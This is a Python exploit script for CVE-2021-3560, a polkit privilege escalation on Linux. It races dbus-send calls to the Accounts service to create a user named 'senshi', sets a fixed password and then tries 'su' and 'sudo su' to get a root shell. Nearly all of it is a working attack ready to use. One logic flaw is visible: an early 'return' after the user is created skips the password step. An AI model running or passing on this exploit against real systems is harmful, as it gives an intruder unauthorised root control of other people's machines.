import os
import sys
import time
import subprocess
import random
import pwd

def runCmd(cmd):
	try:
		subprocess.run([cmd, "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
		return True
	except FileNotFoundError:
		return False

def check():
	if runCmd("accountsservice") and runCmd("gnome-control-center") and runCmd("polkit"):
		return True
	else:
		return False

def main():
	if not check():
		return
	print("**************")
	print("Exploit: Privilege escalation with polkit - CVE-2021-3560")
	print("Exploit code written by Ahmad Almorabea @almorabea")
	print("Original exploit author: Kevin Backhouse ")
	print("For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/")
	print("Updated by Senshiofficial")
	print ("**************")
	print("[+] Starting the Exploit ")
	time.sleep(3)

	check = True
	counter = 0
	while check:
		counter = counter +1
		process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:senshi','string:"Senshi Samui','int32:1'])
		try:
				#print('1 - Running in process', process.pid)
			Random = random.uniform(0.006,0.009)
			process.wait(timeout=Random)
			process.kill()
		except subprocess.TimeoutExpired:
				#print('Timed out - killing', process.pid)
				process.kill()

		user = subprocess.run(['id', 'senshi'], stdout=subprocess.PIPE).stdout.decode('utf-8')
		if user.find("uid") != -1:
			print("[+] User Created with the name of senshi")
			print("[+] Timed out at: "+str(Random))
			check =False
			return
		if counter > 2000:
			print("[-] Couldn't add the user, try again it may work")
			sys.exit(0)


	for i in range(200):
		#print(i)
		uid = "/org/freedesktop/Accounts/User"+str(pwd.getpwnam('senshi').pw_uid)

		#In case you need to put a password un-comment the code below and put your password after string:yourpassword'
		password = "string:samurai"
		res = subprocess.run(['openssl', 'passwd','-5',password], stdout=subprocess.PIPE).stdout.decode('utf-8')
		password = f"string:{res.rstrip()}"

		process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])
		try:
				#print('1 - Running in process', process.pid)
				Random = random.uniform(0.006,0.009)
				process.wait(timeout=Random)
				process.kill()
		except subprocess.TimeoutExpired:
				#print('Timed out - killing', process.pid)
				process.kill()

	print("[+] Timed out at: " + str(Random))
	print("[+] Exploit Completed, Your new user is 'senshi' with the password samurai, just log into it like, 'su senshi', and then 'sudo su' to root")

	p = subprocess.call("(su senshi -c 'sudo su')", shell=True)